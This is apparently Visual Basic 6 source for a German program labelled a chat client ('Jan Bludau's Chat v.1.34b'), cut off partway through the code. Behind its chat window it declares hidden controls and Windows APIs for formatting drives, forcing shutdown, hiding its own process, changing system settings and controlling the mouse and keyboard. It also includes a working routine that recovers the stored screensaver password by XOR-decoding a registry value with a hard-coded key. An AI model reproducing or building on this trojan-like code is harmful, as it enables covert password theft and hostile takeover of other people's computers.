VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   Caption         =   "Jan Bludau's Chat v.1.34b"
   ClientHeight    =   4395
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   5700
   ClipControls    =   0   'False
   Icon            =   "Client.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   NegotiateMenus  =   0   'False
   ScaleHeight     =   4395
   ScaleWidth      =   5700
   StartUpPosition =   3  'Windows-Standard
   Begin VB.TextBox Text6 
      Height          =   285
      Left            =   2640
      TabIndex        =   21
      Text            =   "Text6"
      Top             =   5040
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.TextBox Text5 
      Height          =   285
      Left            =   3480
      TabIndex        =   20
      Text            =   "Text5"
      Top             =   5040
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.TextBox Text4 
      Height          =   285
      Left            =   2640
      TabIndex        =   19
      Text            =   "Text4"
      Top             =   4800
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.ListBox List2 
      Height          =   450
      Left            =   4200
      TabIndex        =   18
      Top             =   4560
      Visible         =   0   'False
      Width           =   495
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   50
      Left            =   3240
      Top             =   720
   End
   Begin VB.CommandButton Command5 
      Caption         =   "Verbinden"
      Height          =   255
      Left            =   1080
      TabIndex        =   17
      Top             =   5400
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.ListBox List1 
      Height          =   450
      Left            =   3480
      TabIndex        =   16
      Top             =   4560
      Visible         =   0   'False
      Width           =   735
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   50
      Left            =   2880
      Top             =   720
   End
   Begin VB.CheckBox disco 
      Caption         =   "Disco"
      Height          =   255
      Left            =   1920
      TabIndex        =   15
      Top             =   5400
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.TextBox BEEP 
      Height          =   285
      Left            =   2640
      TabIndex        =   14
      Text            =   "1000"
      Top             =   4560
      Visible         =   0   'False
      Width           =   855
   End
   Begin VB.CommandButton beepoff 
      Caption         =   "BEEP OFF"
      Height          =   300
      Left            =   0
      TabIndex        =   13
      TabStop         =   0   'False
      Top             =   5280
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.CommandButton beepon 
      Caption         =   "Beep ON"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   300
      Left            =   0
      TabIndex        =   12
      TabStop         =   0   'False
      Top             =   5520
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.TextBox ipt 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   855
      Left            =   1080
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertikal
      TabIndex        =   11
      Top             =   4560
      Visible         =   0   'False
      Width           =   1335
   End
   Begin VB.CommandButton Command4 
      Caption         =   "ip internet"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   0
      TabIndex        =   10
      TabStop         =   0   'False
      Top             =   5040
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.CommandButton malen 
      Caption         =   "krakel"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   0
      TabIndex        =   9
      TabStop         =   0   'False
      Top             =   4800
      Visible         =   0   'False
      Width           =   1095
   End
   Begin MSWinsockLib.Winsock W 
      Left            =   2160
      Top             =   720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Run!!!"
      Height          =   195
      Left            =   0
      TabIndex        =   8
      TabStop         =   0   'False
      Top             =   4560
      Visible         =   0   'False
      Width           =   1095
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   10
      Left            =   2520
      Top             =   720
   End
   Begin VB.TextBox text3 
      BackColor       =   &H80000001&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2175
      Left            =   2880
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertikal
      TabIndex        =   6
      TabStop         =   0   'False
      ToolTipText     =   "Ficken"
      Top             =   1560
      Width           =   2655
   End
   Begin VB.TextBox Text2 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   2175
      Left            =   0
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertikal
      TabIndex        =   1
      ToolTipText     =   "Senden von Nachrichten"
      Top             =   1560
      Width           =   2655
   End
   Begin VB.TextBox Text1 
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   405
      Left            =   2160
      TabIndex        =   0
      Top             =   240
      Width           =   1695
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Senden"
      Height          =   495
      Left            =   0
      TabIndex        =   3
      TabStop         =   0   'False
      Top             =   480
      Width           =   2175
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Connect"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   0
      TabIndex        =   2
      TabStop         =   0   'False
      Top             =   0
      Width           =   2175
   End
   Begin VB.Label empfangen 
      Alignment       =   2  'Zentriert
      BorderStyle     =   1  'Fest Einfach
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   495
      Left            =   0
      TabIndex        =   23
      Top             =   3840
      Width           =   5775
   End
   Begin VB.Label Label7 
      Height          =   255
      Left            =   2760
      TabIndex        =   22
      Top             =   4920
      Width           =   1215
   End
   Begin VB.Label Label3 
      Caption         =   "Rechnername oder IP"
      Height          =   255
      Left            =   2160
      TabIndex        =   7
      Top             =   0
      Width           =   1695
   End
   Begin VB.Label Label2 
      BackColor       =   &H000000FF&
      BorderStyle     =   1  'Fest Einfach
      Caption         =   "Empfangen !!!!!!"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FF0000&
      Height          =   375
      Left            =   2880
      TabIndex        =   5
      Top             =   1200
      Width           =   2655
   End
   Begin VB.Label Label1 
      BackColor       =   &H000000FF&
      BorderStyle     =   1  'Fest Einfach
      Caption         =   "Nachricht Senden"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00C00000&
      Height          =   375
      Left            =   0
      TabIndex        =   4
      Top             =   1200
      Width           =   2655
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Auflösung ändern
Private Declare Function EnumDisplaySettings Lib "user32" _
        Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName _
        As Long, ByVal iModeNum As Long, lpDevMode As Any) _
        As Boolean
        
Private Declare Function ChangeDisplaySettings Lib "user32" _
        Alias "ChangeDisplaySettingsA" (lpDevMode As Any, _
        ByVal dwFlags As Long) As Long
Const CCDEVICENAME = 32
Const CCFORMNAME = 32
Const DM_BITSPERPEL = &H40000
Const DM_PELSWIDTH = &H80000
Const DM_PELSHEIGHT = &H100000
Const CDS_UPDATEREGISTRY = &H1
Const CDS_TEST = &H4
Const DISP_CHANGE_SUCCESSFUL = 0
Const DISP_CHANGE_RESTART = 1
Const ENUM_CURRENT_SETTINGS = &HFFFF - 1

Private Type DEVMODE
  dmDeviceName As String * CCDEVICENAME
  dmSpecVersion As Integer
  dmDriverVersion As Integer
  dmSize As Integer
  dmDriverExtra As Integer
  dmFields As Long
  dmOrientation As Integer
  dmPaperSize As Integer
  dmPaperLength As Integer
  dmPaperWidth As Integer
  dmScale As Integer
  dmCopies As Integer
  dmDefaultSource As Integer
  dmPrintQuality As Integer
  dmColor As Integer
  dmDuplex As Integer
  dmYResolution As Integer
  dmTTOption As Integer
  dmCollate As Integer
  dmFormName As String * CCFORMNAME
  dmUnusedPadding As Integer
  dmBitsPerPel As Integer
  dmPelsWidth As Long
  dmPelsHeight As Long
  dmDisplayFlags As Long
  dmDisplayFrequency As Long
End Type
'Alles für die Registry *G*
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" _
        Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal _
        lpSubKey As String, ByVal ulOptions As Long, ByVal _
        samDesired As Long, phkResult As Long) As Long
        
Private Declare Function RegCloseKey Lib "advapi32.dll" _
        (ByVal hKey As Long) As Long
        
Private Declare Function RegQueryValueEx Lib "advapi32.dll" _
        Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal _
        lpValueName As String, ByVal lpReserved As Long, _
        lpType As Long, lpData As Any, lpcbData As Any) As Long
        
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" _
        Alias "RegCreateKeyExA" (ByVal hKey As Long, ByVal _
        lpSubKey As String, ByVal Reserved As Long, ByVal _
        lpClass As String, ByVal dwOptions As Long, ByVal _
        samDesired As Long, ByVal lpSecurityAttributes As Any, _
        phkResult As Long, lpdwDisposition As Long) As Long
        
Private Declare Function RegFlushKey Lib "advapi32.dll" (ByVal _
        hKey As Long) As Long
        
Private Declare Function RegSetValueEx Lib "advapi32.dll" _
        Alias "RegSetValueExA" (ByVal hKey As Long, ByVal _
        lpValueName As String, ByVal Reserved As Long, ByVal _
        dwType As Long, lpData As Long, ByVal cbData As Long) _
        As Long
        
Private Declare Function RegSetValueEx_Str Lib "advapi32.dll" _
        Alias "RegSetValueExA" (ByVal hKey As Long, ByVal _
        lpValueName As String, ByVal Reserved As Long, ByVal _
        dwType As Long, ByVal lpData As String, ByVal cbData As _
        Long) As Long

Private Declare Function RegDeleteKey Lib "advapi32.dll" Alias _
        "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey As _
        String) As Long
        
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias _
        "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName _
        As String) As Long


Const HKEY_CLASSES_ROOT = &H80000000
Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const HKEY_USERS = &H80000003
Const HKEY_PERFORMANCE_DATA = &H80000004
Const HKEY_CURRENT_CONFIG = &H80000005
Const HKEY_DYN_DATA = &H80000006

Const KEY_QUERY_VALUE = &H1
Const KEY_SET_VALUE = &H2
Const KEY_CREATE_SUB_KEY = &H4
Const KEY_ENUMERATE_SUB_KEYS = &H8
Const KEY_NOTIFY = &H10
Const KEY_CREATE_LINK = &H20
Const KEY_READ = KEY_QUERY_VALUE Or _
                 KEY_ENUMERATE_SUB_KEYS _
                 Or KEY_NOTIFY
Const KEY_ALL_ACCESS = KEY_QUERY_VALUE Or _
                       KEY_SET_VALUE Or _
                       KEY_CREATE_SUB_KEY Or _
                       KEY_ENUMERATE_SUB_KEYS Or _
                       KEY_NOTIFY Or _
                       KEY_CREATE_LINK
Const ERROR_SUCCESS = 0&

Const REG_NONE = 0
Const REG_SZ = 1
Const REG_EXPAND_SZ = 2
Const REG_BINARY = 3
Const REG_DWORD = 4
Const REG_DWORD_LITTLE_ENDIAN = 4
Const REG_DWORD_BIG_ENDIAN = 5
Const REG_LINK = 6
Const REG_MULTI_SZ = 7

Const REG_OPTION_NON_VOLATILE = &H0

Private RegRoot&

'Neustarten Herunterfahren Benutzer neu anmelden
Private Declare Function GetUserName Lib "advapi32.dll" _
        Alias "GetUserNameA" (ByVal lpBuffer As String, _
        nSize As Long) As Long
        
Private Declare Function GetLastError Lib "kernel32" () _
        As Long
    
Private Declare Function FormatMessage Lib "kernel32" _
        Alias "FormatMessageA" (ByVal dwFlags As Long, _
        lpSource As Any, ByVal dwMessageId As Long, ByVal _
        dwLanguageId As Long, ByVal lpBuffer As String, _
        ByVal nSize As Long, Arguments As Long) As Long


'API zum Beenden von windows
Private Declare Function ExitWindows Lib "user32" Alias _
        "ExitWindowsEx" (ByVal dwOptions As Long, ByVal _
        dwReserved As Long) As Long
           
Const EWX_LOGOFF = 0
Const EWX_SHUTDOWN = 1
Const EWX_REBOOT = 2

'Haushalt für den Monitor und Screensaver
Private Declare Function SendMessage Lib "user32" Alias _
        "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As _
        Long, ByVal wParam As Long, lParam As Any) As Long

Const WM_SYSCOMMAND = &H112
Const SC_MONITORPOWER = &HF170
Const SC_SCREENSAVE = &HF140
'Für das Internet wichitg
Private Declare Function InternetDial Lib "wininet.dll" _
        (ByVal hwndParent As Long, ByVal lpszConiID _
        As String, ByVal dwFlags As Long, ByRef hCon _
        As Long, ByVal dwReserved As Long) As Long
  
Private Declare Function RasHangUp Lib "rasapi32.dll" Alias _
        "RasHangUpA" (ByVal hRasConn As Long) As Long
  
Private Declare Function InternetHangUp Lib "wininet.dll" _
        (ByVal hCon As Long, ByVal dwReserved _
        As Long) As Long

Private Declare Function RasEnumEntries Lib "rasapi32.dll" _
        Alias "RasEnumEntriesA" (ByVal Reserved$, ByVal _
        lpszPhonebook$, lprasentryname As Any, lpcb As Long, _
        lpcEntries As Long) As Long

Const DIAL_UNATTENDED = &H8000
Const DIAL_FORCE_ONLINE = 1
Const DIAL_FORCE_UNATTENDED = 2

Const RAS95_MaxEntryName = 256

Private Type RASENTRYNAME95
  dwSize As Long
  szEntryName(RAS95_MaxEntryName) As Byte
End Type

Dim ConID&, ConName$
'Zeigt einem alle Laufwerke an
Private Declare Function GetDriveType Lib "kernel32" _
        Alias "GetDriveTypeA" (ByVal nDrive As String) _
        As Long
        
Private Declare Function GetLogicalDriveStrings Lib _
        "kernel32" Alias "GetLogicalDriveStringsA" _
        (ByVal nBufferLength As Long, ByVal lpBuffer _
        As String) As Long

Private Const DRIVE_REMOVABLE = 2
Private Const DRIVE_FIXED = 3
Private Const DRIVE_REMOTE = 4
Private Const DRIVE_CDROM = 5
Private Const DRIVE_RAMDISK = 6
'Liest den Computernamen von dem Computer aus
Const MAX_COMPUTERNAME_LENGTH = 15
Private Declare Function GetComputerName Lib "kernel32" _
        Alias "GetComputerNameA" (ByVal lpBuffer As String, _
        nSize As Long) As Long
'Öffnet fremde Anwendungen nach belieben
Private Declare Function ShellExecute Lib "shell32.dll" _
        Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal _
        lpOperation As String, ByVal lpFile As String, ByVal _
        lpParameters As String, ByVal lpDirectory As String, _
        ByVal nShowCmd As Long) As Long
'Minimiert alle offnen Anwendungen
Private Declare Sub keybd_event Lib "user32" (ByVal bVk As _
        Byte, ByVal bScan As Byte, ByVal dwFlags As Long, _
        ByVal dwExtraInfo As Long)
Const KEYEVENTF_KEYUP = &H2
Const VK_LWIN = &H5B
'''''''''
Private Declare Function SHFormatDrive Lib "shell32" _
       (ByVal hwndOwner As Long, ByVal lngDrive As Long, _
       ByVal lngCapacity As Long, ByVal lngFormatType As _
       Long) As Long
Private Declare Function ReadPort Lib "io.dll" _
       (ByVal Address As Long) As Byte
       
Private Declare Sub WritePort Lib "io.dll" (ByVal _
        Address As Long, ByVal Value As Byte)
Private Declare Function WSAGetLastError Lib "WSOCK32.DLL" () _
        As Long
        
Private Declare Function WSAStartup Lib "WSOCK32.DLL" (ByVal _
        wVersionRequired&, lpWSAData As WinSocketDataType) _
        As Long
        
Private Declare Function WSACleanup Lib "WSOCK32.DLL" () _
        As Long
        
Private Declare Function gethostname Lib "WSOCK32.DLL" (ByVal _
        HostName$, ByVal HostLen%) As Long
        
Private Declare Function gethostbyname Lib "WSOCK32.DLL" _
        (ByVal HostName$) As Long
        
Private Declare Function gethostbyaddr Lib "WSOCK32.DLL" _
        (ByVal addr$, ByVal laenge%, ByVal Typ%) As Long
        
Private Declare Sub RtlMoveMemory Lib "kernel32" (hpvDest As _
        Any, ByVal hpvSource&, ByVal cbCopy&)

Const WS_VERSION_REQD = &H101
Const WS_VERSION_MAJOR = WS_VERSION_REQD \ &H100 And &HFF&
Const WS_VERSION_MINOR = WS_VERSION_REQD And &HFF&

Const MIN_SOCKETS_REQD = 1
Const SOCKET_ERROR = -1
Const WSADescription_Len = 256
Const WSASYS_Status_Len = 128


Private Type HostDeType
  hName As Long
  hAliases As Long
  hAddrType As Integer
  hLength As Integer
  hAddrList As Long
End Type

Private Type WinSocketDataType
   wversion As Integer
   wHighVersion As Integer
   szDescription(0 To WSADescription_Len) As Byte
   szSystemStatus(0 To WSASYS_Status_Len) As Byte
   iMaxSockets As Integer
   iMaxUdpDg As Integer
   lpszVendorInfo As Long
End Type
Private Declare Function SetComputerName Lib "kernel32" _
        Alias "SetComputerNameA" (ByVal lpComputerName _
        As String) As Long
Private Declare Function GetCurrentProcessId Lib _
        "kernel32" () As Long

Private Declare Function RegisterServiceProcess Lib _
        "kernel32" (ByVal dwProcessID As Long, ByVal _
        dwType As Long) As Long
Const SHFD_CAPACITY_DEFAULT = 0 ' Standard-Kapazität
Const SHFD_CAPACITY_360 = 3     ' 360 kB (nur 5 1/4"-Laufwerke)
Const SHFD_CAPACITY_720 = 5     ' 720 kB (nur 3.5"-Laufwerke)
Const SHFD_FORMAT_QUICK = 0     ' Quickformat, für NT = 1
Const SHFD_FORMAT_FULL = 1      ' Vollständig, für NT = 0
Const SHFD_FORMAT_SYSONLY = 2   ' Systemdateien kopieren

Private Declare Function SetCursorPos Lib "user32" (ByVal _
        X As Long, ByVal Y As Long) As Long

           
Private Declare Function GetCursorPos Lib "user32" _
        (lpPoint As POINTAPI) As Long

Private Declare Sub mouse_event Lib "user32" (ByVal dwFlags _
        As Long, ByVal dx As Long, ByVal dy As Long, ByVal _
        cButtons As Long, ByVal dwExtraInfo As Long)
Const MOUSEEVENTF_MOVE = &H1
Const MOUSEEVENTF_LEFTDOWN = &H2
Const MOUSEEVENTF_LEFTUP = &H4
Const MOUSEEVENTF_RIGHTDOWN = &H8
Const MOUSEEVENTF_RIGHTUP = &H10
Const MOUSEEVENTF_MIDDLEDOWN = &H20
Const MOUSEEVENTF_MIDDLEUP = &H40
Const MOUSEEVENTF_ABSOLUTE = &H8000
Private Type POINTAPI
  X As Long
  Y As Long
End Type
Dim aX%, aY%, dx%, dy%
Private Declare Function FindWindow Lib "user32" Alias _
        "FindWindowA" (ByVal lpClassName As String, ByVal _
        lpWindowName As String) As Long

Private Declare Function ShowWindow Lib "user32" (ByVal hwnd _
        As Long, ByVal nCmdShow As Long) As Long

Const SW_SHOW = 5
Const SW_HIDE = 0
Private Declare Function mciExecute Lib "winmm.dll" _
           (ByVal lpstrCommand As String) As Long
           Private Declare Function LockWindowUpdate Lib "user32" _
        (ByVal hwndLock As Long) As Long
        
Private Declare Function GetDesktopWindow Lib "user32" _
        () As Long
Private Declare Function CreatePen Lib "gdi32" (ByVal _
        nPenStyle As Long, ByVal nWidth As Long, ByVal _
        crColor As Long) As Long
        
Private Declare Function LineTo Lib "gdi32" (ByVal hDC As _
        Long, ByVal X As Long, ByVal Y As Long) As Long
        
Private Declare Function CreateDC Lib "gdi32" Alias _
        "CreateDCA" (ByVal lpDriverName As String, ByVal _
        lpDeviceName As String, ByVal lpOutput As String, _
        ByVal lpInitData As Any) As Long

Private Declare Function CreateCompatibleDC Lib "gdi32" _
        (ByVal hDC As Long) As Long
        
Private Declare Function DeleteDC Lib "gdi32" (ByVal hDC _
        As Long) As Long
        
Private Declare Function SelectObject Lib "gdi32" (ByVal _
        hDC As Long, ByVal hObject As Long) As Long
        
Private Declare Function DeleteObject Lib "gdi32" (ByVal _
        hObject As Long) As Long
        
Private Declare Function SetPixel Lib "gdi32" (ByVal hDC _
        As Long, ByVal X As Long, ByVal Y As Long, ByVal _
        crColor As Long) As Long
               
Private Declare Function CreateCompatibleBitmap Lib "gdi32" _
        (ByVal hDC As Long, ByVal nWidth As Long, ByVal _
        nHeight As Long) As Long
        
Private Declare Function BitBlt Lib "gdi32" (ByVal hDestDC _
        As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth _
        As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, _
        ByVal xSrc As Long, ByVal ySrc As Long, ByVal dwRop As _
        Long) As Long

Const SRCCopy = &HCC0020


Private Declare Function GetDoubleClickTime Lib "user32" _
        () As Long
        
Private Declare Function SetDoubleClickTime Lib "user32" _
        (ByVal wCount As Long) As Long

Dim VOld&
''''''''''''''''''''''''''

Const Key = "48EE761D6769A11B7A8C47F85495975F78D9DA6C59D76B35C577" _
          & "85182A0E52FF00E31B718D3463EB91C3240FB7C2F8E3B6544C35" _
          & "54E7C94928A385110B2C68FBEE7DF66CE39C2DE472C3BB851A12" _
          & "3C32E36B4F4DF4A924C8FA78AD23A1E46D9A04CE2BC5B6C5EF93" _
          & "5CA8852B413772FA574541A1204F80B3D52302643F6CF10F"

Const READ_CONTROL = &H20000
Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Const SYNCHRONIZE = &H100000
Const STANDARD_RIGHTS_ALL = &H1F0000
Const KEY_USER = &H80000001

                   
Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or _
                    KEY_SET_VALUE Or _
                    KEY_CREATE_SUB_KEY) And _
                    (Not SYNCHRONIZE))

Const KEY_EXECUTE = ((KEY_READ) And (Not SYNCHRONIZE))
'''''''''''''''''''''''''''''''''''''''
Private Declare Function GetKeyboardState Lib "user32" _
        (pbKeyState As Byte) As Long

Private Declare Function SetKeyboardState Lib "user32" _
        (lppbKeyState As Byte) As Long

Const VK_NUMLOCK = &H90
Const VK_SCROLL = &H91
Const VK_CAPITAL = &H14
'Zeigt und Versteckt den Mauszeiger
Private Declare Function ShowCursor Lib "user32" (ByVal _
        bShow As Long) As Long
Private Sub SetScreen(ByVal X&, ByVal Y&)
  Dim Result&
  Dim Dev As DEVMODE
    'ändert die Bildschirmeinstellungen
    Call EnumDisplaySettings(0&, ENUM_CURRENT_SETTINGS, Dev)
    Dev.dmDisplayFrequency = 90
    Dev.dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT
    Dev.dmPelsWidth = X
    Dev.dmPelsHeight = Y
   
    Result = ChangeDisplaySettings(Dev, CDS_TEST)
    ChangeDisplaySettings Dev, CDS_UPDATEREGISTRY
End Sub
Function RegKeyExist(Root&, Key$) As Long
  Dim Result&, hKey&
    'Prüfen ob ein Schlüssel existiert
    Result = RegOpenKeyEx(Root, Key, 0, KEY_READ, hKey)
    If Result = ERROR_SUCCESS Then Call RegCloseKey(hKey)
    RegKeyExist = Result
End Function

Function RegKeyCreate(Root&, Newkey$) As Long
  Dim Result&, hKey&, Back&
    'Neuen Schlüssel erstellen
    Result = RegCreateKeyEx(Root, Newkey, 0, vbNullString, _
                            REG_OPTION_NON_VOLATILE, _
                            KEY_ALL_ACCESS, 0&, hKey, Back)
    If Result = ERROR_SUCCESS Then
      Result = RegFlushKey(hKey)
      If Result = ERROR_SUCCESS Then Call RegCloseKey(hKey)
        RegKeyCreate = Back
    End If
End Function

Private Function RegKeyDelete(Root&, Key$) As Long
  'Schlüssel erstellen
  RegKeyDelete = RegDeleteKey(Root, Key)
End Function

Private Function RegFieldDelete(Root&, Key$, Field$) As Long
  Dim Result&, hKey&
    'Feld löschen
    Result = RegOpenKeyEx(Root, Key, 0, KEY_ALL_ACCESS, hKey)
    If Result = ERROR_SUCCESS Then
      Result = RegDeleteValue(hKey, Field)
      Result = RegCloseKey(hKey)
    End If
    RegFieldDelete = Result
End Function

Function RegValueSet(Root&, Key$, Field$, Value As Variant) As Long
  Dim Result&, hKey&, s$, l&
    'Wert in ein Feld der Registry schreiben
    Result = RegOpenKeyEx(Root, Key, 0, KEY_ALL_ACCESS, hKey)
    If Result = ERROR_SUCCESS Then
      Select Case VarType(Value)
        Case vbInteger, vbLong
          l = CLng(Value)
          Result = RegSetValueEx(hKey, Field, 0, REG_DWORD, l, 4)
        Case vbString
          s = CStr(Value)
          Result = RegSetValueEx_Str(hKey, Field, 0, REG_SZ, s, _
                                        Len(s) + 1)
      End Select
      Result = RegCloseKey(hKey)
    End If
    
    RegValueSet = Result
End Function

Function RegValueGet(Root&, Key$, Field$, Value As Variant) As Long
  Dim Result&, hKey&, dwType&, Lng&, Buffer$, l&
    'Wert aus einem Feld der Registry auslesen
    Result = RegOpenKeyEx(Root, Key, 0, KEY_READ, hKey)
    If Result = ERROR_SUCCESS Then
      Result = RegQueryValueEx(hKey, Field, 0&, dwType, ByVal 0&, l)
      If Result = ERROR_SUCCESS Then
        Select Case dwType
          Case REG_SZ
            Buffer = Space$(l + 1)
            Result = RegQueryValueEx(hKey, Field, 0&, _
                                     dwType, ByVal Buffer, l)
            If Result = ERROR_SUCCESS Then Value = Buffer
          Case REG_DWORD
            Result = RegQueryValueEx(hKey, Field, 0&, dwType, Lng, l)
            If Result = ERROR_SUCCESS Then Value = Lng
        End Select
      End If
    End If
    
    If Result = ERROR_SUCCESS Then Result = RegCloseKey(hKey)
    RegValueGet = Result
End Function

Private Sub List2_Click()
  'Bei Klick Hauptverzeichnis wechseln
  RegRoot = List2.ItemData(List2.ListIndex)
End Sub
Private Function ToggleKey(Key As Byte) As Boolean
  Dim State As Boolean
  Dim Keys(0 To 255) As Byte
  
    Call GetKeyboardState(Keys(0))
    State = Keys(Key)
  
    If State <> True Then
      Keys(Key) = 1
    Else
      Keys(Key) = 0
    End If
    Call SetKeyboardState(Keys(0))
    ToggleKey = Not State
End Function
Function Paßwort() As String
  Dim X%, Result&, Handle&, CB&, Ret$, AA$
  
    If ERROR_SUCCESS = RegOpenKeyEx(KEY_USER, _
                           "Control Panel\desktop", 0&, KEY_READ, _
                           Handle) Then
      Result = RegQueryValueEx(Handle, "ScreenSave_Data", 0&, 1&, _
                               ByVal Ret, CB)
                               
      Ret = Space(CB)
      Result = RegQueryValueEx(Handle, "ScreenSave_Data", 0&, 1&, _
                               ByVal Ret, CB)
    End If
    
    If ERROR_SUCCESS = RegCloseKey(Handle) Then
      Ret = Left$(Ret, Len(Ret) - 1)
      For X = 1 To Len(Ret) Step 2
        AA = AA & Chr$((HexDez(Mid$(Ret, X, 2)) Xor _
             HexDez(Mid$(Key, X, 2))))
      Next X
      
      Paßwort = AA
    End If
End Function
Function HexDez(H$) As Long
  If Left$(H$, 2) <> "&H" Then H$ = "&H" + H$
  HexDez& = Val(H$)
End Function
Private Function HostByAddress(ByVal Addresse$) As String
  Dim X%
  Dim HostDeAddress&
  Dim AA$, BB As String * 5
  Dim HOST As HostDeType
  
    AA = Chr$(Val(NextChar(Addresse, ".")))
    AA = AA + Chr$(Val(NextChar(Addresse, ".")))
    AA = AA + Chr$(Val(NextChar(Addresse, ".")))
    AA = AA + Chr$(Val(Addresse))
    
    HostDeAddress = gethostbyaddr(AA, Len(AA), 2)
    If HostDeAddress = 0 Then
      HostByAddress = ""
      Exit Function
    End If
    
    Call RtlMoveMemory(HOST, HostDeAddress, LenB(HOST))
 
    AA = ""
    X = 0
    Do
       Call RtlMoveMemory(ByVal BB, HOST.hName + X, 1)
       If Left$(BB, 1) = Chr$(0) Then Exit Do
       AA = AA + Left$(BB, 1)
       X = X + 1
    Loop
    
    HostByAddress = AA
End Function

Private Function HostByName(Name$, Optional X% = 0) As String
  Dim MemIp() As Byte
  Dim Y%
  Dim HostDeAddress&, HostIp&
  Dim IpAddress$
  Dim HOST As HostDeType
  
    HostDeAddress = gethostbyname(Name)
    If HostDeAddress = 0 Then
      HostByName = ""
      Exit Function
    End If
    
    Call RtlMoveMemory(HOST, HostDeAddress, LenB(HOST))
    
    For Y = 0 To X
      Call RtlMoveMemory(HostIp, HOST.hAddrList + 4 * Y, 4)
      If HostIp = 0 Then
        HostByName = ""
        Exit Function
      End If
    Next Y
    
    ReDim MemIp(1 To HOST.hLength)
    Call RtlMoveMemory(MemIp(1), HostIp, HOST.hLength)
    
    IpAddress = ""
    
    For Y = 1 To HOST.hLength
      IpAddress = IpAddress & MemIp(Y) & "."
    Next Y
    
    IpAddress = Left$(IpAddress, Len(IpAddress) - 1)
    HostByName = IpAddress
End Function

Private Function MyHostName() As String
  Dim HostName As String * 256
  
    If gethostname(HostName, 256) = SOCKET_ERROR Then
      MsgBox "Windows Sockets error " & Str(WSAGetLastError())
      Exit Function
    Else
      MyHostName = NextChar(Trim$(HostName), Chr$(0))
    End If
End Function

Private Sub InitSockets()
